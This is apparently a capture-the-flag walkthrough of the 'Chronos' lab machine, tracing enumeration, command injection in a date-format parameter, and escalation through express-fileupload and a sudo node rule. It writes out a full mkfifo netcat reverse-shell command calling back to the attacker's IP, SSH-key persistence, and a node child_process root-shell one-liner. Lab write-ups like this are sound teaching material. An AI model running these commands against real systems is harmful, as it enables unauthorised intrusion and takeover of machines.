+++
title = "Chronos - Walkthrough"
date = "2026-07-19"
author = "nvru"
description = "Walkthrough for the Chronos machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "apache",
  "nodejs",
  "command-injection",
  "express-fileupload",
  "initial-access",
  "privilege-escalation",
  "medium"
]
draft = false
+++

# Chronos - Walkthrough

## Overview

- **Attacker IP:** `10.151.249.142`
- **Target Machine IP:** `10.151.249.111`

The objective was to enumerate the target, identify exposed services, gain initial access through a **command injection vulnerability**, and escalate privileges by exploiting a vulnerable **express-fileupload** application running on an internal service.

![Machine information](/images/vulnhub/chronos/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.151.249.111
```

### Results

```text
Open 10.151.249.111:22
Open 10.151.249.111:80
Open 10.151.249.111:8000
```

To gather additional information, I performed a full Nmap scan.

```bash
sudo nmap -sSCV -A -p22,80,3306,8080 -oN nmap/ports 10.151.249.111
```

### Nmap Output

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-26 00:07 +0200

Nmap scan report for 10.151.249.111
Host is up (0.00030s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open   http       Apache httpd 2.4.29 ((Ubuntu))
3306/tcp closed mysql
8080/tcp closed http-proxy

Service Info: OS: Linux
```

Only SSH and Apache were publicly accessible, so web enumeration became the next step.

---

# Enumeration

## Apache Web Server

Browsing to the web server initially displayed a simple page showing only the text **"Chronos"** in a custom font.

![Http](/images/vulnhub/chronos/http.png)

Viewing the page source revealed an interesting virtual host:

```text
chrono.local
```

After adding the hostname to my `/etc/hosts` file, the website changed and loaded the actual application. This page displayed the current date and time.

Inspecting the browser's **Developer Tools** showed that the application retrieved the time using the following endpoint:

```text
/date?format=base58
```

The `format` parameter immediately stood out because its value appeared to be passed directly to the backend without proper validation, making it a good candidate for command injection testing.

---

## Command Injection

To verify my suspicion, I began testing the `format` parameter with simple command injection payloads. The application executed the supplied commands, confirming the vulnerability.

After confirming code execution, I attempted to obtain a reverse shell. A standard Netcat payload failed, likely because the target's version of `nc` did not support the required options.

I then switched to the classic `mkfifo` reverse shell payload.

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.151.249.142 9001 >/tmp/f
```

This payload successfully connected back to my listener and provided a shell as the `www-data` user.

---

## Privilege Escalation

### www-data → imera

Checking sudo permissions showed that `www-data` had no useful privileges.

While enumerating the system, I noticed a service listening only on localhost.

```text
127.0.0.1:8080
```

I forwarded the port to my attacking machine using `socat`.

![Port Forwarding](/images/vulnhub/chronos/socat.png)

After opening the forwarded port in the browser, the page simply displayed:

```text
Coming Soon...
```

![Coming Soon](/images/vulnhub/chronos/co_soon.png)

Searching the filesystem for this string quickly located the application's source code.

```bash
grep -R "Coming Soon" /opt
```

![Searching /opt](/images/vulnhub/chronos/opt.png)

The search pointed to an `index.js` file.

Inspecting it revealed the application was using the vulnerable **express-fileupload** package.

![Application Source](/images/vulnhub/chronos/serv_js.png)

Searching for public exploits led to a known exploit for this vulnerable version.

![Exploit Reference](/images/vulnhub/chronos/exp_git.png)

Executing the exploit successfully provided a shell as **imera**.

![Shell as imera](/images/vulnhub/chronos/rev_imera.png)

---

### Stabilizing the Shell

To obtain a fully interactive shell, I upgraded the TTY.

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

After backgrounding the shell:

```bash
stty raw -echo; fg
export TERM=xterm
```

To maintain persistent access, I added my public SSH key.

```bash
mkdir ~/.ssh
vi ~/.ssh/authorized_keys
```

I was then able to connect directly through SSH.

![SSH as imera](/images/vulnhub/chronos/ssh_imera.png)

---

### imera → root

After obtaining access as `imera`, I checked the user's sudo permissions.

```bash
sudo -l
```

The output showed that `imera` could execute both `node` and `npm` as **root** without requiring a password.

```text
(ALL) NOPASSWD: /usr/local/bin/npm *
(ALL) NOPASSWD: /usr/local/bin/node *
```

Since `node` can execute arbitrary JavaScript code, this effectively allows arbitrary command execution as the root user.

A root shell can be spawned directly using Node's `child_process` module:

```bash
sudo /usr/local/bin/node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
```

![Sudo Permissions](/images/vulnhub/chronos/sudo_perm_imera.png)

Executing the command immediately spawned a root shell, completing the privilege escalation.

---

# Flags

```text
user.txt

byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK

Decoded:
o chronos pernaei file mou
```

```text
root.txt

YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK

Decoded:
apopse siopi mazeuoume oneira
```
